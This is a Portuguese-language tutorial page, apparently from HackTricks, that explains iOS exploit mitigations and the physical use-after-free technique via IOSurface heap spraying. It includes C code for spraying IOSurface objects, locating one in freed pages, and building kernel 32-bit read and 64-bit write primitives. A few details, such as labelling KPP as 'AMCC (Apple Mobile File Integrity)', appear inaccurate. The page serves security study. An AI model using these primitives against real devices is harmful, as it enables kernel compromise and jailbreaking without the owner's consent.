# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## iOS Exploit Mitigations

- **Code Signing** no iOS funciona exigindo que cada trecho de código executável (apps, libraries, extensions, etc.) seja criptograficamente assinado com um certificado emitido pela Apple. Quando o código é carregado, o iOS verifica a assinatura digital contra a raiz confiável da Apple. Se a assinatura for inválida, estiver ausente ou tiver sido modificada, o SO se recusa a executá-lo. Isso impede que atacantes injetem código malicioso em apps legítimos ou executem binários não assinados, efetivamente bloqueando a maioria das cadeias de exploit que dependem da execução de código arbitrário ou adulterado.
- **CoreTrust** é o subsistema do iOS responsável por impor a assinatura de código em tempo de execução. Ele verifica diretamente as assinaturas utilizando o certificado raiz da Apple sem depender de caches de confiança, o que significa que apenas binários assinados pela Apple (ou com entitlements válidos) podem ser executados. O CoreTrust garante que mesmo que um atacante tampe com um app após a instalação, modifique libraries do sistema ou tente carregar código não assinado, o sistema bloqueará a execução a menos que o código ainda esteja corretamente assinado. Essa aplicação rígida fecha muitos vetores pós-exploração que versões mais antigas do iOS permitiam através de verificações de assinatura mais fracas ou contornáveis.
- **Data Execution Prevention (DEP)** marca regiões de memória como não-executáveis a menos que contenham explicitamente código. Isso impede que atacantes injetem shellcode em regiões de dados (como stack ou heap) e o executem, forçando-os a depender de técnicas mais complexas como ROP (Return-Oriented Programming).
- **ASLR (Address Space Layout Randomization)** randomiza os endereços de memória de código, libraries, stack e heap a cada execução do sistema. Isso torna muito mais difícil para atacantes preverem onde instruções úteis ou gadgets estão, quebrando muitas cadeias de exploit que dependem de layouts de memória fixos.
- **KASLR (Kernel ASLR)** aplica o mesmo conceito de randomização ao kernel do iOS. Ao embaralhar o endereço base do kernel a cada boot, impede que atacantes localizem de forma confiável funções ou estruturas do kernel, aumentando a dificuldade de exploits em nível de kernel que visariam obter controle total do sistema.
- **Kernel Patch Protection (KPP)** também conhecido como **AMCC (Apple Mobile File Integrity)** no iOS, monitora continuamente as páginas de código do kernel para garantir que elas não foram modificadas. Se qualquer adulteração for detectada — como um exploit tentando patchar funções do kernel ou inserir código malicioso — o dispositivo entrará imediatamente em panic e reiniciará. Essa proteção torna exploits persistentes no kernel muito mais difíceis, pois atacantes não podem simplesmente hookar ou patchar instruções do kernel sem causar um crash do sistema.
- **Kernel Text Readonly Region (KTRR)** é uma funcionalidade de segurança baseada em hardware introduzida em dispositivos iOS. Ela usa o controlador de memória da CPU para marcar a seção de código (text) do kernel como permanentemente somente leitura após o boot. Uma vez bloqueada, até o próprio kernel não pode modificar essa região de memória. Isso impede que atacantes — e mesmo código privilegiado — façam patchs nas instruções do kernel em tempo de execução, fechando uma grande classe de exploits que dependiam de modificar diretamente o código do kernel.
- **Pointer Authentication Codes (PAC)** usam assinaturas criptográficas embutidas em bits não utilizados de pointers para verificar sua integridade antes do uso. Quando um pointer (como um endereço de retorno ou function pointer) é criado, a CPU o assina com uma chave secreta; antes de desreferenciar, a CPU verifica a assinatura. Se o pointer tiver sido adulterado, a verificação falha e a execução é interrompida. Isso impede que atacantes forjem ou reutilizem pointers corrompidos em exploits de corrupção de memória, tornando técnicas como ROP ou JOP muito mais difíceis de executar com confiabilidade.
- **Privilege Access never (PAN)** é uma funcionalidade de hardware que previne que o kernel (modo privilegiado) acesse diretamente a memória do user-space a menos que ative explicitamente esse acesso. Isso impede que atacantes que obtiveram execução de código no kernel leiam ou escrevam facilmente na memória do usuário para escalar privilégios ou roubar dados sensíveis. Ao reforçar a separação estrita, o PAN reduz o impacto de exploits no kernel e bloqueia muitas técnicas comuns de escalonamento de privilégios.
- **Page Protection Layer (PPL)** é um mecanismo de segurança do iOS que protege regiões críticas gerenciadas pelo kernel, especialmente aquelas relacionadas a code signing e entitlements. Ele aplica proteções rígidas de escrita usando a MMU (Memory Management Unit) e verificações adicionais, garantindo que mesmo código privilegiado do kernel não possa modificar arbitrariamente páginas sensíveis. Isso impede que atacantes que obtenham execução em nível de kernel temperem com estruturas críticas de segurança, tornando persistência e bypasses de code-signing significativamente mais difíceis.


## Physical use-after-free

Este é um resumo do post em [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html); além disso, mais informações sobre exploits que usam esta técnica podem ser encontradas em [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

O **espaço de endereço de memória virtual** para processos de usuário no iOS vai de **0x0 a 0x8000000000**. No entanto, esses endereços não mapeiam diretamente para memória física. Em vez disso, o **kernel** usa **page tables** para traduzir endereços virtuais em endereços **físicos** reais.

#### Levels of Page Tables in iOS

As page tables são organizadas hierarquicamente em três níveis:

1. **L1 Page Table (Level 1)**:
* Cada entrada aqui representa uma grande faixa de memória virtual.
* Cobre **0x1000000000 bytes** (ou **256 GB**) de memória virtual.
2. **L2 Page Table (Level 2)**:
* Uma entrada aqui representa uma região menor de memória virtual, especificamente **0x2000000 bytes** (32 MB).
* Uma entrada L1 pode apontar para uma tabela L2 se não conseguir mapear toda a região por si só.
3. **L3 Page Table (Level 3)**:
* Este é o nível mais fino, onde cada entrada mapeia uma única página de **4 KB**.
* Uma entrada L2 pode apontar para uma tabela L3 se for necessário controle mais granular.

#### Mapping Virtual to Physical Memory

* **Direct Mapping (Block Mapping)**:
* Algumas entradas em uma page table mapeiam diretamente uma faixa de endereços virtuais para uma faixa contígua de endereços físicos (como um atalho).
* **Pointer to Child Page Table**:
* Se for necessário controle mais fino, uma entrada em um nível (por exemplo, L1) pode apontar para uma **child page table** no próximo nível (por exemplo, L2).

#### Example: Mapping a Virtual Address

Suponha que você tente acessar o endereço virtual **0x1000000000**:

1. **L1 Table**:
* O kernel verifica a entrada da L1 page table correspondente a esse endereço virtual. Se ela tiver um **pointer para uma L2 page table**, o kernel vai para essa L2.
2. **L2 Table**:
* O kernel verifica a L2 page table para um mapeamento mais detalhado. Se essa entrada apontar para uma **L3 page table**, ele prossegue até lá.
3. **L3 Table**:
* O kernel procura a entrada final L3, que aponta para o **endereço físico** da página de memória real.

#### Example of Address Mapping

Se você escrever o endereço físico **0x800004000** no primeiro índice da tabela L2, então:

* Endereços virtuais de **0x1000000000** até **0x1002000000** mapeiam para endereços físicos de **0x800004000** até **0x802004000**.
* Isso é um **block mapping** no nível L2.

Alternativamente, se a entrada L2 apontar para uma tabela L3:

* Cada página de 4 KB no intervalo virtual **0x1000000000 -> 0x1002000000** seria mapeada por entradas individuais na tabela L3.

### Physical use-after-free

Um **physical use-after-free** (UAF) ocorre quando:

1. Um processo **aloca** alguma memória como **readable e writable**.
2. As **page tables** são atualizadas para mapear essa memória para um endereço físico específico que o processo pode acessar.
3. O processo **desaloca** (free) a memória.
4. Porém, devido a um **bug**, o kernel **esquece de remover o mapeamento** das page tables, mesmo marcando a memória física correspondente como livre.
5. O kernel pode então **realocar essa memória física "liberada"** para outros propósitos, como **dados do kernel**.
6. Como o mapeamento não foi removido, o processo ainda pode **ler e escrever** nessa memória física.

Isso significa que o processo pode acessar **páginas de memória do kernel**, que podem conter dados sensíveis ou estruturas, potencialmente permitindo que um atacante **manipule a memória do kernel**.

### IOSurface Heap Spray

Como o atacante não controla quais páginas do kernel serão alocadas para a memória liberada, ele usa uma técnica chamada **heap spray**:

1. O atacante **cria um grande número de objetos IOSurface** na memória do kernel.
2. Cada objeto IOSurface contém um **valor mágico** em um de seus campos, tornando-o fácil de identificar.
3. Eles **escaneiam as páginas liberadas** para ver se algum desses objetos IOSurface caiu em uma página liberada.
4. Quando encontram um objeto IOSurface em uma página liberada, podem usá-lo para **ler e escrever a memória do kernel**.

Mais informações sobre isso em [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Esteja ciente de que dispositivos iOS 16+ (A12+) trazem mitigations de hardware (como PPL ou SPTM) que tornam técnicas de physical UAF muito menos viáveis.
> PPL impõe proteções MMU estritas em páginas relacionadas a code signing, entitlements e dados sensíveis do kernel, então, mesmo que uma página seja reutilizada, writes vindos do userland ou de código de kernel comprometido para páginas protegidas por PPL são bloqueados.
> Secure Page Table Monitor (SPTM) estende o PPL endurecendo as próprias atualizações de page table. Ele garante que mesmo código privilegiado do kernel não possa remapear silenciosamente páginas liberadas ou tamperar com mapeamentos sem passar por verificações seguras.
> KTRR (Kernel Text Read-Only Region) tranca a seção de código do kernel como somente leitura após o boot. Isso previne qualquer modificação em tempo de execução ao código do kernel, fechando um grande vetor de ataque que exploits de physical UAF frequentemente exploram.
> Além disso, alocações de `IOSurface` são menos previsíveis e mais difíceis de mapear para regiões acessíveis ao usuário, o que torna o truque de "escaneamento por valor mágico" muito menos confiável. E `IOSurface` agora é protegido por entitlements e restrições de sandbox.

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: O atacante cria muitos objetos IOSurface com um identificador especial ("magic value").
2. **Scan Freed Pages**: Eles verificam se algum dos objetos foi alocado em uma página liberada.
3. **Read/Write Kernel Memory**: Manipulando campos no objeto IOSurface, eles obtêm a habilidade de realizar **reads e writes arbitrários** na memória do kernel. Isso permite:
* Usar um campo para **ler qualquer valor 32-bit** na memória do kernel.
* Usar outro campo para **escrever valores 64-bit**, alcançando um primitivo estável de **kernel read/write**.

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Buscar objetos **`IOSurface`** em uma página física liberada:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Obtendo Leitura/Escrita no Kernel com IOSurface

Depois de obter controle sobre um objeto IOSurface na memória do kernel (mapeado para uma página física liberada acessível do userspace), podemos usá-lo para **operações arbitrárias de leitura e escrita no kernel**.

**Campos-chave no IOSurface**

O objeto IOSurface tem dois campos cruciais:

1. **Use Count Pointer**: Permite uma **leitura de 32 bits**.
2. **Indexed Timestamp Pointer**: Permite uma **escrita de 64 bits**.

Ao sobrescrever esses ponteiros, redirecionamos-os para endereços arbitrários na memória do kernel, habilitando capacidades de leitura/escrita.

#### Leitura de 32 bits no Kernel

Para realizar uma leitura:

1. Sobrescreva o **Use Count Pointer** para apontar para o endereço alvo menos um deslocamento de 0x14 bytes.
2. Use o método `get_use_count` para ler o valor nesse endereço.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### Escrita de 64 bits no kernel

Para realizar uma escrita:

1. Sobrescreva o **ponteiro de timestamp indexado** com o endereço de destino.
2. Use o método `set_indexed_timestamp` para escrever um valor de 64 bits.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Resumo do fluxo do exploit

1. **Trigger Physical Use-After-Free**: Páginas liberadas ficam disponíveis para reutilização.
2. **Spray IOSurface Objects**: Alocar muitos objetos IOSurface com um "magic value" único na memória do kernel.
3. **Identify Accessible IOSurface**: Localizar um IOSurface em uma página liberada que você controla.
4. **Abuse Use-After-Free**: Modificar ponteiros no objeto IOSurface para habilitar **leitura/escrita no kernel** arbitrária via métodos do IOSurface.

Com esses primitivos, o exploit fornece **leituras de 32 bits** controladas e **gravações de 64 bits** na memória do kernel. Passos subsequentes de jailbreak podem envolver primitivas de leitura/gravação mais estáveis, que podem requerer contornar proteções adicionais (por exemplo, PPL em dispositivos arm64e mais novos).

{{#include ../../banners/hacktricks-training.md}}
